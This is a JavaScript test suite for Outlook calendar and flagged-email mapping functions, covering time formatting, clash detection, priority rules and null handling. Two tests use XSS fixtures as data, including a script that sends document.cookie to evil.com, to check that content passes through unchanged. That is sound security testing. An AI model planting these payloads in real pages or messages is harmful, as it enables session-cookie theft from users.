/**
 * Automated Test Suite: Task P6.2 — Outlook Mapping Functions & Fixtures
 * Implements verification per docs/outlook-build/SPEC.md §4.3 and §5 (Task P6.2):
 * - Pure mapping functions: mapGraphEventsToDiary, mapGraphMessagesToFlagged
 * - Timezone formatting: Europe/London / GMT Standard Time
 * - Clash detection: overlapping non-all-day events marked with isClash: true and chip: 'URGENT'
 * - Priority resolution: importance high -> 'High', normal -> 'Normal'
 * - XSS safety: fixtures containing <script> tags and injected HTML
 * - Defensive edge cases: null/empty inputs, missing properties, invalid dates
 * - Deduplication and capping at 25 items for flagged emails
 */

import { test, describe } from 'node:test';
import assert from 'node:assert/strict';

import {
  formatEventTimeRange,
  detectEventClashes,
  mapGraphEventsToDiary,
  formatMessageSub,
  mapGraphMessagesToFlagged
} from '../src/services/outlookDataService.js';

describe('Task P6.2: Outlook Mapping Functions & Fixtures', () => {
  // ==========================================
  // Calendar & Diary Mapping Fixtures
  // ==========================================
  describe('Calendar & Diary Mapping (mapGraphEventsToDiary)', () => {
    test('1. formatEventTimeRange handles all-day events, normal ranges, and missing values', () => {
      assert.equal(formatEventTimeRange(null, null, true), 'All day');
      assert.equal(
        formatEventTimeRange(
          { dateTime: '2026-10-21T09:30:00.0000000' },
          { dateTime: '2026-10-21T10:45:00.0000000' },
          false
        ),
        '09:30 - 10:45'
      );
      assert.equal(formatEventTimeRange(null, null, false), '');
      assert.equal(formatEventTimeRange({ dateTime: '2026-10-21T14:00:00Z' }, null, false), '14:00');
    });

    test('2. detectEventClashes identifies overlapping non-all-day events and ignores all-day events', () => {
      const events = [
        {
          id: 'ev1',
          start: { dateTime: '2026-10-21T10:00:00Z' },
          end: { dateTime: '2026-10-21T11:00:00Z' },
          isAllDay: false
        },
        {
          id: 'ev2',
          start: { dateTime: '2026-10-21T10:30:00Z' }, // overlaps with ev1
          end: { dateTime: '2026-10-21T11:30:00Z' },
          isAllDay: false
        },
        {
          id: 'ev3',
          start: { dateTime: '2026-10-21T12:00:00Z' }, // no overlap
          end: { dateTime: '2026-10-21T13:00:00Z' },
          isAllDay: false
        },
        {
          id: 'ev4',
          start: { dateTime: '2026-10-21T10:00:00Z' }, // all-day event should not trigger clash
          end: { dateTime: '2026-10-21T23:59:59Z' },
          isAllDay: true
        }
      ];

      const clashIds = detectEventClashes(events);
      assert.equal(clashIds.has('ev1'), true);
      assert.equal(clashIds.has('ev2'), true);
      assert.equal(clashIds.has('ev3'), false);
      assert.equal(clashIds.has('ev4'), false);
    });

    test('3. mapGraphEventsToDiary maps full Graph calendar event fixture into DIARY_ITEMS shape', () => {
      const fixtureEvents = [
        {
          id: 'graph_evt_101',
          subject: 'Trinova Board Q3 Statutory Review',
          start: { dateTime: '2026-10-21T10:00:00.0000000', timeZone: 'GMT Standard Time' },
          end: { dateTime: '2026-10-21T11:00:00.0000000', timeZone: 'GMT Standard Time' },
          location: { displayName: 'Boardroom Mayfair' },
          isAllDay: false,
          showAs: 'busy',
          importance: 'normal'
        },
        {
          id: 'graph_evt_102',
          subject: 'Staff Out of Office / Training',
          start: { dateTime: '2026-10-21T00:00:00.0000000', timeZone: 'GMT Standard Time' },
          end: { dateTime: '2026-10-21T23:59:59.0000000', timeZone: 'GMT Standard Time' },
          location: {},
          isAllDay: true,
          showAs: 'oof',
          importance: 'normal'
        }
      ];

      const mapped = mapGraphEventsToDiary(fixtureEvents);
      assert.equal(mapped.length, 2);

      // Event 1
      assert.equal(mapped[0].id, 'graph_evt_101');
      assert.equal(mapped[0].title, 'Trinova Board Q3 Statutory Review');
      assert.equal(mapped[0].time, '10:00 - 11:00');
      assert.equal(mapped[0].chip, 'TODAY');
      assert.equal(mapped[0].location, 'Boardroom Mayfair');
      assert.equal(mapped[0].isAllDay, false);
      assert.equal(mapped[0].isClash, false);
      assert.equal(mapped[0].showAs, 'busy');

      // Event 2: All day
      assert.equal(mapped[1].id, 'graph_evt_102');
      assert.equal(mapped[1].title, 'Staff Out of Office / Training');
      assert.equal(mapped[1].time, 'All day');
      assert.equal(mapped[1].chip, 'TODAY');
      assert.equal(mapped[1].location, '');
      assert.equal(mapped[1].isAllDay, true);
    });

    test('4. mapGraphEventsToDiary correctly processes XSS payloads in subject and location', () => {
      const xssEvents = [
        {
          id: 'xss_evt_1',
          subject: "<script>alert('xss-subject')</script>",
          start: { dateTime: '2026-10-21T14:00:00.0000000' },
          end: { dateTime: '2026-10-21T15:00:00.0000000' },
          location: { displayName: '<img src=x onerror=alert("xss-loc")>' },
          isAllDay: false
        }
      ];

      const mapped = mapGraphEventsToDiary(xssEvents);
      assert.equal(mapped.length, 1);
      // Pure mapper preserves exact content for frontend escapeHtml
      assert.equal(mapped[0].title, "<script>alert('xss-subject')</script>");
      assert.equal(mapped[0].location, '<img src=x onerror=alert("xss-loc")>');
    });

    test('5. mapGraphEventsToDiary gracefully handles missing subject and null inputs', () => {
      assert.deepEqual(mapGraphEventsToDiary(null), []);
      assert.deepEqual(mapGraphEventsToDiary('not an array'), []);

      const incomplete = [
        {
          id: 'evt_no_subj',
          start: { dateTime: '2026-10-21T16:00:00Z' },
          end: { dateTime: '2026-10-21T17:00:00Z' }
        }
      ];

      const mapped = mapGraphEventsToDiary(incomplete);
      assert.equal(mapped.length, 1);
      assert.equal(mapped[0].title, '(No subject)');
      assert.equal(mapped[0].location, '');
      assert.equal(mapped[0].isClash, false);
    });
  });

  // ==========================================
  // Flagged Emails Mapping Fixtures
  // ==========================================
  describe('Flagged Emails Mapping (mapGraphMessagesToFlagged)', () => {
    test('6. formatMessageSub formats sender name and date accurately', () => {
      assert.equal(formatMessageSub('Sarah Jenkins', '2026-10-21T09:15:00Z'), 'Sarah Jenkins · 21 Oct, 09:15');
      assert.equal(formatMessageSub(null, '2026-10-21T09:15:00Z'), 'Unknown sender · 21 Oct, 09:15');
      assert.equal(formatMessageSub('Hamza Malik', null), 'Hamza Malik');
      assert.equal(formatMessageSub('Hamza Malik', 'invalid-date'), 'Hamza Malik');
    });

    test('7. mapGraphMessagesToFlagged maps Graph messages to ATTENTION_EMAILS shape with priority rules', () => {
      const fixtureMessages = [
        {
          id: 'msg_001',
          subject: 'URGENT: Woofington Park Strike-Off Warning',
          from: { emailAddress: { name: 'Companies House Registrar', address: 'enquiries@companieshouse.gov.uk' } },
          receivedDateTime: '2026-10-21T08:00:00Z',
          importance: 'high',
          webLink: 'https://outlook.office.com/mail/id/msg_001'
        },
        {
          id: 'msg_002',
          subject: 'Weekly Portfolio Briefing',
          from: { emailAddress: { name: '', address: 'reports@trinova.co.uk' } },
          receivedDateTime: '2026-10-21T07:30:00Z',
          importance: 'normal',
          webLink: 'https://outlook.office.com/mail/id/msg_002'
        },
        {
          id: 'msg_003',
          subject: 'Newsletter Archive',
          from: null,
          receivedDateTime: '2026-10-20T12:00:00Z',
          importance: 'low',
          webLink: null
        }
      ];

      const mapped = mapGraphMessagesToFlagged(fixtureMessages);
      assert.equal(mapped.length, 3);

      // Message 1: High priority
      assert.equal(mapped[0].id, 'msg_001');
      assert.equal(mapped[0].title, 'URGENT: Woofington Park Strike-Off Warning');
      assert.equal(mapped[0].priority, 'High');
      assert.equal(mapped[0].from, 'Companies House Registrar');
      assert.equal(mapped[0].sub, 'Companies House Registrar · 21 Oct, 08:00');
      assert.equal(mapped[0].webLink, 'https://outlook.office.com/mail/id/msg_001');

      // Message 2: Normal priority with address fallback
      assert.equal(mapped[1].id, 'msg_002');
      assert.equal(mapped[1].priority, 'Normal');
      assert.equal(mapped[1].from, 'reports@trinova.co.uk');
      assert.ok(mapped[1].sub.includes('reports@trinova.co.uk'));

      // Message 3: Low priority maps to Normal
      assert.equal(mapped[2].id, 'msg_003');
      assert.equal(mapped[2].priority, 'Normal');
      assert.equal(mapped[2].from, 'Unknown sender');
      assert.ok(mapped[2].sub.includes('Unknown sender'));
    });

    test('8. mapGraphMessagesToFlagged correctly processes XSS payloads in subject and sender', () => {
      const xssMessages = [
        {
          id: 'xss_msg_1',
          subject: "<script>document.location='http://evil.com/?c='+document.cookie</script>",
          from: { emailAddress: { name: '<b onmouseover=alert(1)>Hacked</b>', address: 'evil@attacker.com' } },
          receivedDateTime: '2026-10-21T11:00:00Z',
          importance: 'high'
        }
      ];

      const mapped = mapGraphMessagesToFlagged(xssMessages);
      assert.equal(mapped.length, 1);
      assert.equal(mapped[0].title, "<script>document.location='http://evil.com/?c='+document.cookie</script>");
      assert.equal(mapped[0].from, '<b onmouseover=alert(1)>Hacked</b>');
      assert.ok(mapped[0].sub.includes('<b onmouseover=alert(1)>Hacked</b>'));
    });

    test('9. mapGraphMessagesToFlagged gracefully handles null and malformed messages', () => {
      assert.deepEqual(mapGraphMessagesToFlagged(null), []);
      assert.deepEqual(mapGraphMessagesToFlagged('invalid'), []);

      const emptyMsg = [{}];
      const mapped = mapGraphMessagesToFlagged(emptyMsg);
      assert.equal(mapped.length, 1);
      assert.equal(mapped[0].title, '(No subject)');
      assert.equal(mapped[0].from, 'Unknown sender');
      assert.equal(mapped[0].priority, 'Normal');
      assert.equal(mapped[0].sub, 'Unknown sender');
    });
  });
});
